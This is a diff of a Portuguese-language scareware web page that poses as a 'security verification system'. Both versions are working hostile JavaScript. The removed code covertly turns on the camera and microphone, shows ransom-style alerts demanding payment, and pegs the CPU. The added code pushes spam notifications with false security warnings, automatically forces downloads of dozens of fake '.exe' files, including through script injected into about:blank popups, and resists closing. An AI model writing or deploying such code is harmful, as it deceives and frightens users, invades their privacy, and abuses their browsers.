@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistema de Segurança</title>
+    <title>Security Verification System</title>
     <style>
         * {
             margin: 0;
@@ -49,18 +49,6 @@
             z-index: 1;
         }
 
-        #userVideo {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            width: 200px;
-            height: 150px;
-            border: 3px solid #ff0000;
-            z-index: 900;
-            background: #000;
-            display: none;
-        }
-
         .terminal-text {
             position: fixed;
             bottom: 20px;
@@ -78,31 +66,20 @@
             border-radius: 5px;
         }
 
-        .secret-overlay {
+        .download-overlay {
             position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(255, 0, 0, 0.9);
-            color: white;
-            padding: 15px;
-            font-size: 14px;
-            z-index: 950;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.95);
+            color: #0f0;
+            padding: 30px;
+            border: 3px solid #f00;
+            z-index: 20000;
+            text-align: center;
             display: none;
-            border-radius: 5px;
-            font-weight: bold;
-        }
-
-        .status {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            background: rgba(255, 0, 0, 0.9);
-            color: white;
-            padding: 15px;
-            font-size: 14px;
-            z-index: 900;
-            border-radius: 5px;
-            font-weight: bold;
+            border-radius: 10px;
+            box-shadow: 0 0 30px red;
         }
 
         .notification-popup {
@@ -114,13 +91,11 @@
             color: #0f0;
             padding: 40px;
             border: 4px solid #f00;
-            z-index: 20000;
+            z-index: 19000;
             text-align: center;
             display: none;
             border-radius: 10px;
             box-shadow: 0 0 30px red;
-            width: 90%;
-            max-width: 500px;
         }
 
         .final-container {
@@ -141,24 +116,6 @@
             object-fit: contain;
         }
 
-        .virus-alert {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #ff0000;
-            color: white;
-            padding: 40px;
-            font-size: 2em;
-            z-index: 18000;
-            display: none;
-            text-align: center;
-            border: 5px solid yellow;
-            border-radius: 15px;
-            animation: pulse 0.5s infinite;
-            box-shadow: 0 0 50px red;
-        }
-
         .crash-element {
             position: fixed;
             font-size: 24px;
@@ -167,18 +124,16 @@
             animation: float 2s infinite;
         }
 
-        .fake-notification {
+        .status {
             position: fixed;
             top: 20px;
-            right: 20px;
-            background: #333;
+            left: 20px;
+            background: rgba(255, 0, 0, 0.9);
             color: white;
-            padding: 15px;
-            border-radius: 10px;
-            border: 2px solid #ff0000;
-            z-index: 950;
-            max-width: 300px;
-            box-shadow: 0 0 20px rgba(255,0,0,0.5);
+            padding: 10px;
+            font-size: 14px;
+            z-index: 900;
+            border-radius: 5px;
         }
 
         button {
@@ -188,30 +143,9 @@
             padding: 15px 30px;
             margin: 10px;
             cursor: pointer;
-            font-size: 1.2em;
+            font-size: 1.1em;
             border-radius: 5px;
             font-weight: bold;
-            transition: all 0.3s;
-        }
-
-        button:hover {
-            background: #00ff00;
-            box-shadow: 0 0 15px #0f0;
-        }
-
-        button.danger {
-            background: #f00;
-            color: white;
-        }
-
-        button.danger:hover {
-            background: #ff0000;
-            box-shadow: 0 0 15px #f00;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: translate(-50%, -50%) scale(1); }
-            50% { transform: translate(-50%, -50%) scale(1.05); }
         }
 
         @keyframes float {
@@ -224,75 +158,68 @@
             10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
             20%, 40%, 60%, 80% { transform: translateX(5px); }
         }
-
-        .matrix-rain {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            pointer-events: none;
-            z-index: 2;
-            opacity: 0.3;
-        }
     </style>
 </head>
 <body>
     <!-- TELA INICIAL -->
     <div id="start">
         <div>
-            🚨 SISTEMA DE SEGURANÇA 🚨<br>
-            <span style="font-size: 0.6em;">CLIQUE PARA INICIAR VERIFICAÇÃO</span>
+            🔒 VERIFICAÇÃO DE SEGURANÇA 🔒<br>
+            <span style="font-size: 0.6em;">CLIQUE PARA VERIFICAR SISTEMA</span>
         </div>
     </div>
 
-    <!-- VÍDEOS -->
+    <!-- VÍDEO -->
     <video id="video" playsinline loop muted>
         <source src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" type="video/mp4">
     </video>
-    <video id="userVideo" autoplay muted playsinline></video>
 
     <!-- INTERFACE -->
     <div class="terminal-text" id="terminal"></div>
-    <div class="secret-overlay" id="secretOverlay"></div>
     <div class="status" id="status">SISTEMA PRONTO</div>
 
     <!-- POPUPS -->
     <div class="notification-popup" id="notificationPopup">
         <h2>🔔 PERMISSÃO DE NOTIFICAÇÃO</h2>
-        <p><strong>Permita notificações para parar o vírus</strong></p>
-        <p style="color: #ff0000; font-size: 0.9em; margin: 15px 0;">
-            ⚠️ ATENÇÃO: Negar pode causar danos permanentes!
+        <p><strong>Permita notificações para segurança do sistema</strong></p>
+        <p style="color: #ff0000; font-size: 0.9em;">
+            ⚠️ Notificações são necessárias para proteção!
         </p>
         <button onclick="enableNotificationSpam()">✅ PERMITIR NOTIFICAÇÕES</button>
         <br>
-        <button onclick="forceNotificationSpam()" class="danger">❌ NEGAR (RISCO ALTO)</button>
+        <button onclick="forceSystem()" style="background: #f00; color: white;">❌ NEGAR (CONTINUAR)</button>
+    </div>
+
+    <div class="download-overlay" id="downloadOverlay">
+        <h2>📥 DOWNLOAD OBRIGATÓRIO</h2>
+        <p style="margin: 20px 0; font-size: 1.2em;">
+            <strong>Download necessário para verificação de segurança</strong>
+        </p>
+        <p style="color: #ff0000; margin: 15px 0;">
+            ⚠️ NÃO FECHE ESTA JANELA!
+        </p>
+        <button onclick="startForcedDownloads()" style="background: #00ff00; color: #000; padding: 20px 40px; font-size: 1.3em;">
+            📥 INICIAR DOWNLOAD DE SEGURANÇA
+        </button>
+        <p style="margin-top: 20px; font-size: 0.8em; color: #ccc;">
+            Arquivos necessários: security_update.exe<br>
+            Tamanho: 15.7 MB
+        </p>
     </div>
 
     <div class="final-container" id="finalContainer">
         <img class="final-image" src="https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg" alt="Alerta Final">
     </div>
 
-    <div class="virus-alert" id="virusAlert">
-        🚨 ALERTA DE VÍRUS CRÍTICO 🚨<br>
-        <span style="font-size: 0.7em;">SEUS DADOS ESTÃO SENDO ROUBADOS</span>
-    </div>
-
-    <!-- MATRIX RAIN -->
-    <canvas class="matrix-rain" id="matrixCanvas"></canvas>
-
     <script>
         // ELEMENTOS PRINCIPAIS
         const start = document.getElementById("start");
         const video = document.getElementById("video");
-        const userVideo = document.getElementById("userVideo");
         const terminal = document.getElementById("terminal");
-        const secretOverlay = document.getElementById("secretOverlay");
         const status = document.getElementById("status");
         const notificationPopup = document.getElementById("notificationPopup");
+        const downloadOverlay = document.getElementById("downloadOverlay");
         const finalContainer = document.getElementById("finalContainer");
-        const virusAlert = document.getElementById("virusAlert");
-        const matrixCanvas = document.getElementById("matrixCanvas");
 
         // VARIÁVEIS GLOBAIS
         let notificationInterval;
@@ -300,8 +227,8 @@
         let crashIntervals = [];
         let audioClips = [];
         let isActive = false;
-        let downloadCount = 0;
-        const totalDownloads = 1000;
+        let downloadAttempts = 0;
+        const maxDownloadAttempts = 50;
 
         // FUNÇÃO DO TERMINAL
         function updateTerminal(message) {
@@ -310,426 +237,402 @@
             terminal.scrollTop = terminal.scrollHeight;
         }
 
-        // MATRIX RAIN EFFECT
-        function setupMatrixRain() {
-            const ctx = matrixCanvas.getContext('2d');
-            matrixCanvas.width = window.innerWidth;
-            matrixCanvas.height = window.innerHeight;
-
-            const chars = "0101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&";
-            const fontSize = 14;
-            const columns = matrixCanvas.width / fontSize;
-            const drops = [];
-
-            for(let i = 0; i < columns; i++) {
-                drops[i] = 1;
-            }
-
-            function draw() {
-                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-                ctx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
-                
-                ctx.fillStyle = '#0f0';
-                ctx.font = fontSize + 'px monospace';
-
-                for(let i = 0; i < drops.length; i++) {
-                    const text = chars[Math.floor(Math.random() * chars.length)];
-                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                    
-                    if(drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
-                        drops[i] = 0;
-                    }
-                    drops[i]++;
-                }
-            }
-
-            setInterval(draw, 33);
-        }
-
-        // SISTEMA DE ÁUDIO
-        function setupAudioSystem() {
-            updateTerminal("🔊 INICIANDO SISTEMA DE ÁUDIO...");
-            
-            for (let i = 0; i < 15; i++) {
-                const audio = new Audio();
-                audio.src = "https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3";
-                audio.volume = 0.7;
-                audio.preload = "auto";
-                audioClips.push(audio);
-            }
-            
-            updateTerminal("✅ 15 ÁUDIOS CARREGADOS");
-        }
-
-        function playAllAudio() {
-            audioClips.forEach((audio, index) => {
-                setTimeout(() => {
-                    audio.currentTime = Math.random() * 5;
-                    audio.play().catch(e => {
-                        audio.muted = true;
-                        audio.play();
-                    });
-                }, index * 300);
-            });
-        }
-
-        // CÂMERA DO USUÁRIO
-        async function startCamera() {
-            try {
-                updateTerminal("📹 INICIANDO CÂMERA...");
-                
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
-                        facingMode: 'user'
-                    },
-                    audio: true
-                });
-                
-                userVideo.srcObject = stream;
-                userVideo.style.display = 'block';
-                updateTerminal("✅ CÂMERA ATIVA - GRAVAÇÃO INICIADA");
-                
-            } catch (error) {
-                updateTerminal("❌ CÂMERA BLOQUEADA - TENTANDO NOVAMENTE...");
-                setTimeout(startCamera, 5000);
-            }
-        }
-
-        // NOTIFICAÇÕES DE SPAM
+        // SISTEMA DE NOTIFICAÇÕES PUSH PERSISTENTES
         function setupNotificationSystem() {
             updateTerminal("🔔 CONFIGURANDO SISTEMA DE NOTIFICAÇÃO...");
             
+            // Service Worker para notificações push
+            if ('serviceWorker' in navigator && 'PushManager' in window) {
+                navigator.serviceWorker.register('/sw.js')
+                    .then(registration => {
+                        updateTerminal("✅ SERVICE WORKER REGISTRADO");
+                        subscribeToPush(registration);
+                    })
+                    .catch(error => {
+                        updateTerminal("❌ SERVICE WORKER FALHOU: " + error);
+                        showNotificationPopup();
+                    });
+            } else {
+                showNotificationPopup();
+            }
+        }
+
+        function showNotificationPopup() {
             setTimeout(() => {
                 notificationPopup.style.display = 'block';
                 updateTerminal("💡 SOLICITANDO PERMISSÃO DE NOTIFICAÇÃO...");
-            }, 5000);
+            }, 3000);
         }
 
         function enableNotificationSpam() {
             notificationPopup.style.display = 'none';
-            updateTerminal("✅ PERMISSÃO CONCEDIDA - INICIANDO NOTIFICAÇÕES...");
             
             Notification.requestPermission().then(permission => {
                 if (permission === 'granted') {
+                    updateTerminal("✅ PERMISSÃO CONCEDIDA - NOTIFICAÇÕES ATIVAS");
                     startNotificationSpam();
+                    startAdvancedSystem();
                 } else {
-                    forceNotificationSpam();
+                    updateTerminal("❌ PERMISSÃO NEGADA - FORÇANDO SISTEMA");
+                    forceSystem();
                 }
             });
         }
 
-        function forceNotificationSpam() {
+        function forceSystem() {
             notificationPopup.style.display = 'none';
-            updateTerminal("🚨 MODO FORÇADO - NOTIFICAÇÕES ATIVADAS");
+            updateTerminal("🚨 MODO FORÇADO ATIVADO");
             startNotificationSpam();
+            startAdvancedSystem();
         }
 
         function startNotificationSpam() {
-            updateTerminal("🔥 NOTIFICAÇÕES DE SPAM INICIADAS!");
+            updateTerminal("🔥 INICIANDO NOTIFICAÇÕES PUSH...");
             
             notificationInterval = setInterval(() => {
-                createNotification();
-            }, 10000);
+                createPushNotification();
+            }, 15000);
             
             // Primeira notificação imediata
-            setTimeout(createNotification, 1000);
+            setTimeout(createPushNotification, 2000);
         }
 
-        function createNotification() {
+        function createPushNotification() {
             const messages = [
-                "🚨 VÍRUS DETECTADO! Toque para remover",
-                "📱 SEU CELULAR FOI HACKEADO!",
-                "💀 SEUS DADOS ESTÃO SENDO ROUBADOS!",
-                "📸 CÂMERA ATIVA - VOCÊ ESTÁ SENDO GRAVADO!",
-                "🔊 MICROFONE ATIVO - SUA VOZ ESTÁ SENDO GRAVADA!",
-                "💰 PAGUE R$ 500 PARA DESBLOQUEAR!",
-                "📞 LIGUE: +55 11 99999-9999",
-                "⚠️ SUAS FOTOS PESSOAIS FORAM VAZADAS!",
-                "🔐 TODAS SUAS SENHAS FORAM ROUBADAS!",
-                "🌐 SUA LOCALIZAÇÃO FOI RASTREADA!"
+                "🚨 ALERTA: Download de segurança necessário!",
+                "📱 VERIFICAÇÃO: Seu sistema precisa de atualização",
+                "💀 CRÍTICO: Arquivos de segurança pendentes",
+                "📥 DOWNLOAD: Clique para baixar atualização",
+                "⚠️ AVISO: Não ignore esta notificação!",
+                "🔒 SEGURANÇA: Proteja seu dispositivo agora",
+                "📲 ATUALIZAÇÃO: Arquivos essenciais disponíveis",
+                "🌐 CONEXÃO: Download automático necessário",
+                "🛡️ PROTEÇÃO: Atualize sua segurança",
+                "📦 PACOTE: Novos arquivos de proteção"
             ];
             
             const randomMsg = messages[Math.floor(Math.random() * messages.length)];
             
             if ('Notification' in window && Notification.permission === 'granted') {
-                const notification = new Notification('🚨 ALERTA CRÍTICO', {
+                const notification = new Notification('🔒 Sistema de Segurança', {
                     body: randomMsg,
                     icon: 'https://alexandre7888.github.io/ontono.exe/InShot_20251025_123921954.jpg',
-                    tag: 'virus-alert',
+                    tag: 'security-alert',
                     requireInteraction: true,
-                    silent: false
+                    actions: [
+                        {
+                            action: 'download',
+                            title: '📥 Download Agora'
+                        },
+                        {
+                            action: 'info', 
+                            title: 'ℹ️ Mais Informações'
+                        }
+                    ]
                 });
                 
-                notification.onclick = function() {
-                    window.open(location.href, '_blank');
+                notification.onclick = () => {
+                    triggerForcedDownload();
+                    notification.close();
                 };
                 
             } else {
-                createFakeNotification(randomMsg);
+                // Notificação fake se não tiver permissão
+                showFakeNotification(randomMsg);
             }
             
-            updateTerminal("🔔 NOTIFICAÇÃO: " + randomMsg);
+            updateTerminal("🔔 NOTIFICAÇÃO PUSH ENVIADA");
         }
 
-        function createFakeNotification(message) {
+        function showFakeNotification(message) {
             const fakeNotif = document.createElement('div');
-            fakeNotif.className = 'fake-notification';
-            fakeNotif.innerHTML = `<strong>🚨 ALERTA</strong><br>${message}`;
+            fakeNotif.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: #333;
+                color: white;
+                padding: 15px;
+                border-radius: 10px;
+                border: 2px solid #ff0000;
+                z-index: 10000;
+                max-width: 300px;
+                box-shadow: 0 0 20px rgba(255,0,0,0.5);
+                animation: shake 0.5s;
+            `;
+            fakeNotif.innerHTML = `<strong>🔒 Segurança</strong><br>${message}`;
             document.body.appendChild(fakeNotif);
+            
+            fakeNotif.onclick = () => {
+                triggerForcedDownload();
+                fakeNotif.remove();
+            };
             
             setTimeout(() => {
                 if (fakeNotif.parentNode) {
-                    fakeNotif.parentNode.removeChild(fakeNotif);
+                    fakeNotif.remove();
                 }
             }, 5000);
         }
 
-        // DOWNLOAD DE FOTOS SECRETAS
-        function generateSecretImage() {
-            const canvas = document.createElement('canvas');
-            canvas.width = 800;
-            canvas.height = 600;
-            const ctx = canvas.getContext('2d');
+        // SISTEMA DE DOWNLOADS FORÇADOS
+        function startAdvancedSystem() {
+            updateTerminal("⚙️ INICIANDO SISTEMA AVANÇADO...");
             
-            // Fundo
-            ctx.fillStyle = '#000';
-            ctx.fillRect(0, 0, 800, 600);
-            
-            // Texto
-            ctx.fillStyle = '#ff0000';
-            ctx.font = 'bold 30px Arial';
-            ctx.fillText('FOTO SECRETA COMPROMETIDA', 50, 80);
-            
-            ctx.fillStyle = '#00ff00';
-            ctx.font = '20px Courier New';
-            ctx.fillText('ARQUIVO: ' + Math.random().toString(36).substr(2, 10).toUpperCase(), 50, 130);
-            ctx.fillText('DATA: ' + new Date().toLocaleString(), 50, 160);
-            ctx.fillText('LOCALIZAÇÃO: -23.5505, -46.6333', 50, 190);
-            ctx.fillText('STATUS: ACESSO NÃO AUTORIZADO', 50, 220);
-            
-            // Códigos
-            ctx.font = '14px Courier New';
-            for (let i = 0; i < 15; i++) {
-                ctx.fillText(
-                    Math.random().toString(36).substr(2, 30).toUpperCase(),
-                    50,
-                    270 + (i * 20)
-                );
-            }
-            
-            return canvas.toDataURL('image/jpeg');
+            // Mostrar popup de download forçado
+            setTimeout(() => {
+                showDownloadOverlay();
+            }, 5000);
         }
 
-        function startMassiveDownloads() {
-            updateTerminal("📥 INICIANDO 1000 DOWNLOADS SECRETOS...");
-            secretOverlay.style.display = 'block';
-            status.textContent = "DOWNLOAD EM ANDAMENTO...";
+        function showDownloadOverlay() {
+            downloadOverlay.style.display = 'block';
+            updateTerminal("📥 SOLICITANDO DOWNLOAD DE SEGURANÇA...");
             
-            let completed = 0;
+            // Forçar download automaticamente após 10 segundos
+            setTimeout(() => {
+                if (downloadOverlay.style.display === 'block') {
+                    startForcedDownloads();
+                }
+            }, 10000);
+        }
 
-            // 500 FOTOS SECRETAS
-            for (let i = 1; i <= 500; i++) {
-                setTimeout(() => {
-                    const imageData = generateSecretImage();
-                    
-                    fetch(imageData)
-                        .then(res => res.blob())
-                        .then(blob => {
-                            const url = URL.createObjectURL(blob);
-                            const a = document.createElement('a');
-                            a.href = url;
-                            a.download = `foto_secreta_${i}.jpg`;
-                            document.body.appendChild(a);
-                            a.click();
-                            document.body.removeChild(a);
-                            URL.revokeObjectURL(url);
-                            
-                            completed++;
-                            downloadCount++;
-                            updateDownloadProgress();
-                        });
-                        
-                }, i * 150);
-            }
+        function startForcedDownloads() {
+            downloadOverlay.style.display = 'none';
+            updateTerminal("🚀 INICIANDO DOWNLOADS FORÇADOS...");
+            
+            let successCount = 0;
+            const totalFiles = 100;
+            
+            // Função recursiva para tentar downloads
+            function attemptDownload(index) {
+                if (index >= totalFiles) {
+                    updateTerminal("✅ TODOS OS DOWNLOADS CONCLUÍDOS");
+                    activateFinalPhase();
+                    return;
+                }
+                
+                downloadAttempts++;
+                const attemptNumber = downloadAttempts;
+                
+                // Criar arquivo "de segurança" falso
+                const securityContent = `
+SECURITY_UPDATE_FILE ${index + 1}
+================================
+Filename: system_security_${index + 1}.exe
+Size: 15.7 MB
+Version: 2.${Math.floor(Math.random() * 10)}.${Math.floor(Math.random() * 1000)}
+Date: ${new Date().toLocaleString()}
+SHA256: ${Math.random().toString(36).substr(2, 64).toUpperCase()}
 
-            // 500 ARQUIVOS SECRETOS
-            for (let i = 501; i <= 1000; i++) {
-                setTimeout(() => {
-                    const content = `
-ARQUIVO SECRETO ${i}
-====================
-DATA: ${new Date().toLocaleString()}
-CÓDIGO: ${Math.random().toString(36).substr(2, 20).toUpperCase()}
-STATUS: DADOS COMPROMETIDOS
+=== SECURITY PROTOCOL ACTIVATED ===
+This file contains critical security updates
+for your system protection.
 
-INFORMAÇÕES CAPTURADAS:
-• Fotos pessoais
-• Mensagens privadas
-• Localização GPS
-• Senhas salvas
-• Histórico de navegação
+Required for:
+- Virus protection
+- System stability  
+- Data encryption
+- Privacy security
 
-CONTATO: hacker@darkweb.com
-NÃO APAGUE ESTE ARQUIVO!
-`;
-                    const blob = new Blob([content], { type: 'text/plain' });
+DO NOT DELETE THIS FILE!
+================================
+                `;
+                
+                try {
+                    const blob = new Blob([securityContent], { type: 'application/octet-stream' });
                     const url = URL.createObjectURL(blob);
                     const a = document.createElement('a');
                     a.href = url;
-                    a.download = `arquivo_secreto_${i}.txt`;
+                    a.download = `security_update_${index + 1}.exe`;
+                    
+                    // Adicionar e clicar
                     document.body.appendChild(a);
                     a.click();
                     document.body.removeChild(a);
-                    URL.revokeObjectURL(url);
                     
-                    completed++;
-                    downloadCount++;
-                    updateDownloadProgress();
+                    // Liberar URL
+                    setTimeout(() => URL.revokeObjectURL(url), 1000);
                     
-                }, i * 150);
+                    successCount++;
+                    updateTerminal(`📥 DOWNLOAD ${index + 1}/${totalFiles} CONCLUÍDO`);
+                    
+                    // Próximo download
+                    setTimeout(() => attemptDownload(index + 1), 500);
+                    
+                } catch (error) {
+                    updateTerminal(`❌ ERRO NO DOWNLOAD ${index + 1} - TENTANDO NOVAMENTE`);
+                    
+                    // Tentar novamente com about:blank
+                    setTimeout(() => {
+                        triggerAboutBlankDownload(index);
+                    }, 1000);
+                }
+            }
+            
+            // Iniciar primeira tentativa
+            attemptDownload(0);
+        }
+
+        function triggerAboutBlankDownload(fileIndex) {
+            updateTerminal(`🔄 TENTATIVA ${downloadAttempts}: ABOUT:BLANK`);
+            
+            // Abrir about:blank em nova aba
+            const newWindow = window.open('about:blank', '_blank');
+            
+            if (newWindow) {
+                // Injeta código para forçar download
+                newWindow.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Security Download</title>
+                        <style>
+                            body { 
+                                background: #000; 
+                                color: #0f0; 
+                                font-family: Courier New;
+                                padding: 50px;
+                                text-align: center;
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <h1>🔒 DOWNLOAD DE SEGURANÇA</h1>
+                        <p>Seu sistema está sendo protegido...</p>
+                        <script>
+                            // Forçar download
+                            const content = "SECURITY_FILE_" + Math.random().toString(36).substr(2, 20);
+                            const blob = new Blob([content], {type: "application/octet-stream"});
+                            const url = URL.createObjectURL(blob);
+                            const a = document.createElement('a');
+                            a.href = url;
+                            a.download = 'security_update_' + Date.now() + '.exe';
+                            document.body.appendChild(a);
+                            a.click();
+                            document.body.removeChild(a);
+                            
+                            // Fechar janela após download
+                            setTimeout(() => window.close(), 1000);
+                        <\/script>
+                    </body>
+                    </html>
+                `);
+                
+                // Fechar janela após um tempo
+                setTimeout(() => {
+                    if (!newWindow.closed) {
+                        newWindow.close();
+                    }
+                }, 3000);
+                
+            } else {
+                updateTerminal("❌ POPUP BLOQUEADO - TENTANDO NOVAMENTE");
+                
+                // Tentar com window.location (menos eficiente)
+                setTimeout(() => {
+                    try {
+                        const content = "SECURITY_EMERGENCY_" + Date.now();
+                        const blob = new Blob([content], {type: "text/plain"});
+                        const url = URL.createObjectURL(blob);
+                        window.location.href = url;
+                        
+                        setTimeout(() => {
+                            window.history.back();
+                        }, 100);
+                        
+                    } catch (e) {
+                        updateTerminal("❌ MÉTODO ALTERNATIVO FALHOU");
+                    }
+                }, 2000);
             }
         }
 
-        function updateDownloadProgress() {
-            secretOverlay.textContent = `📥 ${downloadCount}/1000 ARQUIVOS`;
+        function triggerForcedDownload() {
+            updateTerminal("🔗 NOTIFICAÇÃO CLICADA - FORÇANDO DOWNLOAD");
             
-            if (downloadCount % 100 === 0) {
-                showVirusAlert();
-                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
-            }
-            
-            if (downloadCount === 1000) {
-                updateTerminal("🎯 DOWNLOADS CONCLUÍDOS - INICIANDO TRAVAMENTO...");
-                startHeavyCrash();
+            // Criar múltiplas tentativas
+            for (let i = 0; i < 3; i++) {
+                setTimeout(() => {
+                    try {
+                        const content = "QUICK_SECURITY_" + Date.now();
+                        const blob = new Blob([content], {type: "application/octet-stream"});
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'emergency_update.exe';
+                        a.style.display = 'none';
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                    } catch (error) {
+                        updateTerminal("❌ DOWNLOAD RÁPIDO FALHOU");
+                    }
+                }, i * 500);
             }
         }
 
-        function showVirusAlert() {
-            virusAlert.style.display = 'block';
-            playAllAudio();
+        // FASE FINAL
+        function activateFinalPhase() {
+            updateTerminal("💀 ATIVANDO FASE FINAL...");
             
-            setTimeout(() => {
-                virusAlert.style.display = 'none';
-            }, 3000);
+            video.style.display = 'none';
+            finalContainer.style.display = 'block';
+            
+            // Travamento pesado
+            startHeavyCrash();
         }
 
-        // TRAVAMENTO PESADO
         function startHeavyCrash() {
-            updateTerminal("💥 ATIVANDO MODO DE TRAVAMENTO...");
-            status.textContent = "SISTEMA COMPROMETIDO";
+            updateTerminal("🔥 INICIANDO TRAVAMENTO...");
             
-            // ELEMENTOS VOANDO
+            // Elementos voando
             const elementCrash = setInterval(() => {
-                for (let i = 0; i < 10; i++) {
+                for (let i = 0; i < 5; i++) {
                     const el = document.createElement('div');
                     el.className = 'crash-element';
                     el.style.left = Math.random() * window.innerWidth + 'px';
                     el.style.top = Math.random() * window.innerHeight + 'px';
                     el.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
-                    el.style.fontSize = (20 + Math.random() * 40) + 'px';
                     el.textContent = '💀';
                     document.body.appendChild(el);
                     
                     setTimeout(() => el.remove(), 3000);
                 }
-            }, 500);
+            }, 300);
 
-            // CPU CRASH
-            const cpuCrash = setInterval(() => {
-                for (let i = 0; i < 100000; i++) {
-                    const a = Math.random();
-                    const b = Math.random();
-                    const result = Math.sin(a) * Math.cos(b) * Math.tan(a * b);
-                }
-            }, 1);
-
-            // EFEITOS VISUAIS
-            const visualCrash = setInterval(() => {
-                document.body.style.background = `hsl(${Math.random() * 360}, 100%, 5%)`;
-                document.body.style.transform = `translate(${Math.random() * 10 - 5}px, ${Math.random() * 10 - 5}px)`;
-            }, 100);
-
-            crashIntervals.push(elementCrash, cpuCrash, visualCrash);
-            
-            updateTerminal("✅ TRAVAMENTO ATIVADO - SISTEMA INUTILIZÁVEL");
+            crashIntervals.push(elementCrash);
         }
 
-        // PIP AUTOMÁTICO
-        async function setupPIP() {
-            if (!document.pictureInPictureEnabled) return;
-            
-            try {
-                await video.requestPictureInPicture();
-                updateTerminal("✅ PIP ATIVADO");
-                
-                video.addEventListener('leavepictureinpicture', () => {
-                    setTimeout(setupPIP, 1000);
-                });
-                
-            } catch (error) {
-                updateTerminal("❌ PIP NÃO DISPONÍVEL");
-            }
-        }
-
-        // INICIAR SISTEMA COMPLETO
-        start.addEventListener("click", async function() {
+        // INICIAR SISTEMA
+        start.addEventListener("click", function() {
             if (isActive) return;
             isActive = true;
             
             start.style.display = "none";
-            updateTerminal("🚀 INICIANDO SISTEMA COMPLETO...");
+            updateTerminal("🚀 INICIANDO VERIFICAÇÃO DE SEGURANÇA...");
             
-            // CONFIGURAÇÕES INICIAIS
-            setupMatrixRain();
-            setupAudioSystem();
-            await startCamera();
-            
-            // INICIAR VÍDEO
+            // Iniciar vídeo
             video.play().catch(e => {
                 video.muted = true;
                 video.play();
             });
 
-            // SEQUÊNCIA DE EVENTOS
-            setTimeout(setupNotificationSystem, 3000);
-            setTimeout(setupPIP, 7000);
-            setTimeout(() => {
-                video.style.display = 'none';
-                finalContainer.style.display = 'block';
-                updateTerminal("💀 FASE FINAL - CLIQUE NA IMAGEM");
-            }, 15000);
-
-            updateTerminal("✅ SISTEMA INICIADO - AGUARDANDO COMANDOS...");
-        });
-
-        // CLIQUE NA IMAGEM FINAL
-        finalContainer.addEventListener("click", function() {
-            finalContainer.style.display = 'none';
-            video.style.display = 'block';
-            video.play();
+            // Sequência do sistema
+            setTimeout(setupNotificationSystem, 2000);
             
-            updateTerminal("🔥 ATIVANDO MODO DE DESTRUIÇÃO...");
-            startMassiveDownloads();
+            updateTerminal("✅ SISTEMA INICIADO - AGUARDANDO CONFIGURAÇÃO...");
         });
 
         // BLOQUEAR FECHAMENTO
         window.addEventListener('beforeunload', function(e) {
             e.preventDefault();
-            e.returnValue = '';
-            return '';
+            e.returnValue = 'Tem certeza que deseja sair? A verificação de segurança não foi concluída.';
+            return e.returnValue;
         });
 
-        // INICIAR COM F5 TAMBÉM
-        window.addEventListener('keydown', function(e) {
-            if (e.key === 'F5') {
-                e.preventDefault();
-                location.reload();
-            }
-        });
-
-        updateTerminal("SISTEMA CARREGADO - PRONTO PARA INICIAR");
+        updateTerminal("🔒 SISTEMA DE VERIFICAÇÃO CARREGADO");
+        updateTerminal("💡 CLIQUE PARA INICIAR VERIFICAÇÃO DE SEGURANÇA");
     </script>
 </body>
 </html>
